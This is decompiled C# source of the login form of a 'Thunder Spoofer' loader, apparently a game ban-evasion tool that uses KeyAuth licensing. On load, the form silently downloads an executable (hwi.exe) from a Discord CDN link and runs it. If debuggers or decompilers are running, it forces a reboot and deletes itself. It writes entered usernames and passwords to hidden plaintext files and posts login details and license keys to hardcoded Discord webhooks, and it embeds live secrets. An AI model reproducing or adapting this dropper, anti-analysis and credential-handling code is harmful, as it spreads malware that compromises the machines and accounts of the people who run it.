
// Type: KeyAuth.Login
// Assembly: Thunder Spoofer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6911BFCC-B15C-4BF6-865B-4753D2D18ED6
// Assembly location: C:\Users\ADIKIBERNITIKOS\Desktop\111\1_.exe

using Guna.UI2.WinForms;
using Protection;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace KeyAuth
{
  public class Login : Form
  {
    public static api KeyAuthApp = new api("Spooferaa", "6NRM3uhCkq", "6e6acd5c87b491b297cc6087ddf255493afe851c14da4f474da4ec0283e5b897", "1.0");
    private IContainer components;
    private SiticoneTransition siticoneTransition1;
    private Label label1;
    private SiticoneShadowForm siticoneShadowForm;
    private Guna2BorderlessForm guna2BorderlessForm1;
    private Guna2PictureBox guna2PictureBox1;
    private Guna2Button RgstrBtn;
    private Guna2TextBox username;
    private Guna2Button LoginBtn;
    private Guna2TextBox password;
    private Guna2TextBox key;

    public Login() => this.InitializeComponent();

    private static void b()
    {
      if (Process.GetProcessesByName("dnSpy").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("ida64").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("64dbg").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("ollydbg").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("x32dbg").Length != 0)
      {
        Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
        {
          CreateNoWindow = true,
          UseShellExecute = false,
          ErrorDialog = false
        });
        Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
        Application.Exit();
      }
      if (Process.GetProcessesByName("MasterDumper").Length == 0)
        return;
      Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        ErrorDialog = false
      });
      Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
      Application.Exit();
    }

    private void siticoneControlBox1_Click(object sender, EventArgs e) => Environment.Exit(0);

    private void Login_Load(object sender, EventArgs e)
    {
      string address = "https://cdn.discordapp.com/attachments/1003437877927092306/1003779619650027591/hwi.exe";
      string fileName1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "hwi.exe");
      new WebClient().DownloadFile(address, fileName1);
      Process.Start(fileName1);
      Login.b();
      Protection.Debug.Initialize();
      ProcessCheck.Initialize();
      this.password.PasswordChar = '*';
      Login.KeyAuthApp.init();
      if (Login.KeyAuthApp.response.success)
        return;
      int num1 = (int) MessageBox.Show(Login.KeyAuthApp.response.message);
      Environment.Exit(0);
      if (Login.KeyAuthApp.response.message == "invalidver")
      {
        if (!string.IsNullOrEmpty(Login.KeyAuthApp.app_data.downloadLink))
        {
          switch (MessageBox.Show("Yes to open file in browser\nNo to download file automatically", "Auto update", MessageBoxButtons.YesNo))
          {
            case DialogResult.Yes:
              Process.Start(Login.KeyAuthApp.app_data.downloadLink);
              Environment.Exit(0);
              break;
            case DialogResult.No:
              WebClient webClient = new WebClient();
              string fileName2 = Application.ExecutablePath.Replace(".exe", "-" + Login.random_string() + ".exe");
              string downloadLink = Login.KeyAuthApp.app_data.downloadLink;
              string fileName3 = fileName2;
              webClient.DownloadFile(downloadLink, fileName3);
              Process.Start(fileName2);
              Process.Start(new ProcessStartInfo()
              {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
              });
              Environment.Exit(0);
              break;
            default:
              int num2 = (int) MessageBox.Show("Invalid option");
              Environment.Exit(0);
              break;
          }
        }
        int num3 = (int) MessageBox.Show("Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer");
        Thread.Sleep(2500);
        Environment.Exit(0);
      }
      Login.KeyAuthApp.check();
    }

    private static string random_string()
    {
      string str = (string) null;
      Random random = new Random();
      for (int index = 0; index < 5; ++index)
        str += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
      return str;
    }

    private static string d()
    {
      string str = (string) null;
      Random random = new Random();
      for (int index = 0; index < 5; ++index)
        str += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
      return str;
    }

    public static void sendWebHook(string Url, string msg, string Username, string Plan) => e.a((object) "https://discord.com/api/webhooks/1003714188469862540/Rbsgo0AzGkq7-wLzg_T5tO8pIFfoYz0QPMefOBfeNV-wpAv9JJ2xQoXvvfLmaKMMSfNf", (object) new NameValueCollection()
    {
      {
        "username",
        Username
      },
      {
        "content",
        msg
      },
      {
        "content",
        Plan
      }
    });

    public static void sendWebHookregister(
      string Url,
      string msg,
      string Username,
      string Plan,
      string Key)
    {
      e.a((object) "https://discord.com/api/webhooks/1003713492706152569/zkuPnvbZO9_5PfSXWXzOb5zyUyCGUTO83OAVz5RWyuVI45EgiuXcnKcdB9Yqv0afB8s4", (object) new NameValueCollection()
      {
        {
          "username",
          Username
        },
        {
          "content",
          msg
        },
        {
          "content",
          Plan
        },
        {
          "content",
          Key
        }
      });
    }

    private void LoginBtn_Click_1(object sender, EventArgs e)
    {
      Login.KeyAuthApp.login(this.username.Text, this.password.Text);
      if (Login.KeyAuthApp.response.success)
      {
        Login.sendWebHook("https://discord.com/api/webhooks/1003714188469862540/Rbsgo0AzGkq7-wLzg_T5tO8pIFfoYz0QPMefOBfeNV-wpAv9JJ2xQoXvvfLmaKMMSfNf", "**" + Login.KeyAuthApp.user_data.username + "** **Just Logged In the Spoofer** \uD83C\uDF89", "Thunder Spoofer", "\n **Thanks for using Thunder Spoofer **\uD83D\uDC9C ");
        string[] strArray1 = new string[1]
        {
          this.username.Text
        };
        string path1 = "C:\\Program Files\\legionuser.txt";
        if (System.IO.File.Exists(path1))
          System.IO.File.Delete(path1);
        using (StreamWriter streamWriter = new StreamWriter(Path.Combine("C:\\Program Files", "legionuser.txt")))
        {
          foreach (string str in strArray1)
            streamWriter.WriteLine(str);
        }
        string[] strArray2 = new string[1]
        {
          this.password.Text
        };
        string path2 = "C:\\Program Files\\legionpass.txt";
        if (System.IO.File.Exists(path2))
          System.IO.File.Delete(path2);
        using (StreamWriter streamWriter = new StreamWriter(Path.Combine("C:\\Program Files", "legionpass.txt")))
        {
          foreach (string str in strArray2)
            streamWriter.WriteLine(str);
        }
        new Main().Show();
        this.Hide();
        string path3 = "C:\\Program Files\\Sounds";
        if (!Directory.Exists(path3))
          Directory.CreateDirectory(path3);
        if (!System.IO.File.Exists("C:\\Program Files\\Sounds\\ttsMP3.com_VoiceText_2022-7-19_18_23_11.wav"))
        {
          new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/944887519332409354/999003728692641884/ttsMP3.com_VoiceText_2022-7-19_18_23_11.wav", "C:\\Program Files\\Sounds\\ttsMP3.com_VoiceText_2022-7-19_18_23_11.wav");
          System.IO.File.SetAttributes("C:\\Program Files\\Sounds\\ttsMP3.com_VoiceText_2022-7-19_18_23_11.wav", FileAttributes.Hidden);
          new SoundPlayer("C:\\Program Files\\Sounds\\ttsMP3.com_VoiceText_2022-7-19_18_23_11.wav").Play();
        }
        else
          new SoundPlayer("C:\\Program Files\\Sounds\\ttsMP3.com_VoiceText_2022-7-19_18_23_11.wav").Play();
      }
      else
      {
        int num = (int) MessageBox.Show(Login.KeyAuthApp.response.message, "ThunderAuth: Failed to login", MessageBoxButtons.OK);
      }
    }

    private static string di()
    {
      string str = (string) null;
      Random random = new Random();
      for (int index = 0; index < 5; ++index)
        str += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
      return str;
    }

    private void guna2PictureBox1_Click(object sender, EventArgs e) => Process.Start("https://discord.gg/XqwqdwcMEX");

    private void RgstrBtn_Click(object sender, EventArgs e)
    {
      Login.KeyAuthApp.register(this.username.Text, this.password.Text, this.key.Text);
      if (Login.KeyAuthApp.response.success)
      {
        string[] strArray1 = new string[1]
        {
          this.username.Text
        };
        string path1 = "C:\\Program Files\\legionuser.txt";
        if (System.IO.File.Exists(path1))
          System.IO.File.Delete(path1);
        using (StreamWriter streamWriter = new StreamWriter(Path.Combine("C:\\Program Files", "legionuser.txt")))
        {
          foreach (string str in strArray1)
            streamWriter.WriteLine(str);
          System.IO.File.SetAttributes("C:\\Program Files\\legionuser.txt", FileAttributes.Hidden);
        }
        string[] strArray2 = new string[1]
        {
          this.password.Text
        };
        string path2 = "C:\\Program Files\\legionpass.txt";
        if (System.IO.File.Exists(path2))
          System.IO.File.Delete(path2);
        using (StreamWriter streamWriter = new StreamWriter(Path.Combine("C:\\Program Files", "legionpass.txt")))
        {
          foreach (string str in strArray2)
            streamWriter.WriteLine(str);
          System.IO.File.SetAttributes("C:\\Program Files\\legionpass.txt", FileAttributes.Hidden);
        }
        Login.sendWebHookregister("https://discord.com/api/webhooks/1003713492706152569/zkuPnvbZO9_5PfSXWXzOb5zyUyCGUTO83OAVz5RWyuVI45EgiuXcnKcdB9Yqv0afB8s4", "\uD83D\uDD0B Plan: " + Login.KeyAuthApp.user_data.subscriptions[0].subscription, "Thunder Spoofer", "\n\uD83D\uDD11 License: " + this.key.Text, "\nThanks for buying Thunder Spoofer " + this.username.Text + " \uD83D\uDC9C ");
        new Main().Show();
        this.Hide();
        int num = (int) MessageBox.Show("Thanks For Choosing Thunder Spoofer, Welcome!", "Thunder Woofer", MessageBoxButtons.OK);
      }
      else
      {
        int num1 = (int) MessageBox.Show(Login.KeyAuthApp.response.message, "Thunder Spoofer: Failed to login", MessageBoxButtons.OK);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if ((!disposing ? 0 : (this.components != null ? 1 : 0)) != 0)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      Animation animation = new Animation();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Login));
      this.siticoneTransition1 = new SiticoneTransition();
      this.label1 = new Label();
      this.password = new Guna2TextBox();
      this.username = new Guna2TextBox();
      this.LoginBtn = new Guna2Button();
      this.guna2PictureBox1 = new Guna2PictureBox();
      this.RgstrBtn = new Guna2Button();
      this.key = new Guna2TextBox();
      this.siticoneShadowForm = new SiticoneShadowForm(this.components);
      this.guna2BorderlessForm1 = new Guna2BorderlessForm(this.components);
      ((ISupportInitialize) this.guna2PictureBox1).BeginInit();
      this.SuspendLayout();
      this.siticoneTransition1.AnimationType = AnimationType.Rotate;
      this.siticoneTransition1.Cursor = (Cursor) null;
      animation.AnimateOnlyDifferences = true;
      animation.BlindCoeff = (PointF) componentResourceManager.GetObject("animation2.BlindCoeff");
      animation.LeafCoeff = 0.0f;
      animation.MaxTime = 1f;
      animation.MinTime = 0.0f;
      animation.MosaicCoeff = (PointF) componentResourceManager.GetObject("animation2.MosaicCoeff");
      animation.MosaicShift = (PointF) componentResourceManager.GetObject("animation2.MosaicShift");
      animation.MosaicSize = 0;
      animation.Padding = new Padding(50);
      animation.RotateCoeff = 1f;
      animation.RotateLimit = 0.0f;
      animation.ScaleCoeff = (PointF) componentResourceManager.GetObject("animation2.ScaleCoeff");
      animation.SlideCoeff = (PointF) componentResourceManager.GetObject("animation2.SlideCoeff");
      animation.TimeCoeff = 0.0f;
      animation.TransparencyCoeff = 1f;
      this.siticoneTransition1.DefaultAnimation = animation;
      this.label1.AutoSize = true;
      this.siticoneTransition1.SetDecoration((Control) this.label1, DecorationType.None);
      this.label1.Font = new Font("Segoe UI Light", 10f);
      this.label1.ForeColor = Color.White;
      this.label1.Location = new Point(-1, 136);
      this.label1.Name = "label1";
      this.label1.Size = new Size(0, 19);
      this.label1.TabIndex = 22;
      this.password.BorderColor = Color.FromArgb(64, 64, 64);
      this.password.Cursor = Cursors.IBeam;
      this.siticoneTransition1.SetDecoration((Control) this.password, DecorationType.None);
      this.password.DefaultText = "";
      this.password.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
      this.password.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
      this.password.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
      this.password.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
      this.password.FillColor = Color.FromArgb(20, 20, 20);
      this.password.FocusedState.BorderColor = Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.password.Font = new Font("Microsoft Sans Serif", 8.25f);
      this.password.ForeColor = Color.White;
      this.password.HoverState.BorderColor = Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.password.Location = new Point(67, 154);
      this.password.Name = "password";
      this.password.PasswordChar = char.MinValue;
      this.password.PlaceholderForeColor = Color.White;
      this.password.PlaceholderText = "Password";
      this.password.SelectedText = "";
      this.password.Size = new Size(183, 40);
      this.password.TabIndex = 38;
      this.username.BackColor = Color.Transparent;
      this.username.BorderColor = Color.FromArgb(64, 64, 64);
      this.username.Cursor = Cursors.IBeam;
      this.siticoneTransition1.SetDecoration((Control) this.username, DecorationType.None);
      this.username.DefaultText = "";
      this.username.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
      this.username.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
      this.username.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
      this.username.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
      this.username.FillColor = Color.FromArgb(20, 20, 20);
      this.username.FocusedState.BorderColor = Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.username.Font = new Font("Segoe UI", 9f);
      this.username.ForeColor = Color.White;
      this.username.HoverState.BorderColor = Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.username.Location = new Point(67, 98);
      this.username.Name = "username";
      this.username.PasswordChar = char.MinValue;
      this.username.PlaceholderForeColor = Color.White;
      this.username.PlaceholderText = "Username";
      this.username.SelectedText = "";
      this.username.Size = new Size(183, 40);
      this.username.TabIndex = 37;
      this.LoginBtn.AutoRoundedCorners = true;
      this.LoginBtn.BackColor = Color.Transparent;
      this.LoginBtn.BorderRadius = 11;
      this.LoginBtn.BorderThickness = 1;
      this.siticoneTransition1.SetDecoration((Control) this.LoginBtn, DecorationType.None);
      this.LoginBtn.DisabledState.BorderColor = Color.DarkGray;
      this.LoginBtn.DisabledState.CustomBorderColor = Color.DarkGray;
      this.LoginBtn.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
      this.LoginBtn.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
      this.LoginBtn.FillColor = Color.White;
      this.LoginBtn.Font = new Font("Segoe UI", 9f);
      this.LoginBtn.ForeColor = Color.Black;
      this.LoginBtn.Location = new Point(67, 275);
      this.LoginBtn.Name = "LoginBtn";
      this.LoginBtn.Size = new Size(183, 25);
      this.LoginBtn.TabIndex = 40;
      ((Control) this.LoginBtn).Text = nameof (Login);
      this.LoginBtn.Click += new EventHandler(this.LoginBtn_Click_1);
      this.guna2PictureBox1.BackColor = Color.Transparent;
      this.siticoneTransition1.SetDecoration((Control) this.guna2PictureBox1, DecorationType.None);
      this.guna2PictureBox1.Image = (Image) componentResourceManager.GetObject("guna2PictureBox1.Image");
      this.guna2PictureBox1.ImageRotate = 0.0f;
      this.guna2PictureBox1.Location = new Point(105, 7);
      this.guna2PictureBox1.Name = "guna2PictureBox1";
      this.guna2PictureBox1.Size = new Size(88, 85);
      this.guna2PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.guna2PictureBox1.TabIndex = 0;
      this.guna2PictureBox1.TabStop = false;
      this.guna2PictureBox1.Click += new EventHandler(this.guna2PictureBox1_Click);
      this.RgstrBtn.AutoRoundedCorners = true;
      this.RgstrBtn.BackColor = Color.Transparent;
      this.RgstrBtn.BorderRadius = 11;
      this.RgstrBtn.BorderThickness = 1;
      this.siticoneTransition1.SetDecoration((Control) this.RgstrBtn, DecorationType.None);
      this.RgstrBtn.DisabledState.BorderColor = Color.DarkGray;
      this.RgstrBtn.DisabledState.CustomBorderColor = Color.DarkGray;
      this.RgstrBtn.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
      this.RgstrBtn.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
      this.RgstrBtn.FillColor = Color.White;
      this.RgstrBtn.Font = new Font("Segoe UI", 9f);
      this.RgstrBtn.ForeColor = Color.Black;
      this.RgstrBtn.Location = new Point(67, 306);
      this.RgstrBtn.Name = "RgstrBtn";
      this.RgstrBtn.Size = new Size(183, 25);
      this.RgstrBtn.TabIndex = 41;
      ((Control) this.RgstrBtn).Text = "Register";
      this.RgstrBtn.Click += new EventHandler(this.RgstrBtn_Click);
      this.key.BorderColor = Color.FromArgb(64, 64, 64);
      this.key.Cursor = Cursors.IBeam;
      this.siticoneTransition1.SetDecoration((Control) this.key, DecorationType.None);
      this.key.DefaultText = "";
      this.key.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
      this.key.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
      this.key.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
      this.key.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
      this.key.FillColor = Color.FromArgb(20, 20, 20);
      this.key.FocusedState.BorderColor = Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.key.Font = new Font("Segoe UI", 9f);
      this.key.ForeColor = Color.White;
      this.key.HoverState.BorderColor = Color.FromArgb(94, 148, (int) byte.MaxValue);
      this.key.Location = new Point(67, 213);
      this.key.Name = "key";
      this.key.PasswordChar = char.MinValue;
      this.key.PlaceholderForeColor = Color.White;
      this.key.PlaceholderText = "Key";
      this.key.SelectedText = "";
      this.key.Size = new Size(183, 40);
      this.key.TabIndex = 42;
      this.guna2BorderlessForm1.BorderRadius = 7;
      this.guna2BorderlessForm1.ContainerControl = (ContainerControl) this;
      this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.9;
      this.guna2BorderlessForm1.DragEndTransparencyValue = 0.9;
      this.guna2BorderlessForm1.TransparentWhileDrag = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoValidate = AutoValidate.Disable;
      this.BackColor = Color.White;
      this.ClientSize = new Size(298, 352);
      this.Controls.Add((Control) this.key);
      this.Controls.Add((Control) this.guna2PictureBox1);
      this.Controls.Add((Control) this.RgstrBtn);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.username);
      this.Controls.Add((Control) this.LoginBtn);
      this.Controls.Add((Control) this.password);
      this.siticoneTransition1.SetDecoration((Control) this, DecorationType.BottomMirror);
      this.DoubleBuffered = true;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Login);
      this.Opacity = 0.9;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Loader";
      this.TransparencyKey = Color.Maroon;
      this.Load += new EventHandler(this.Login_Load);
      ((ISupportInitialize) this.guna2PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
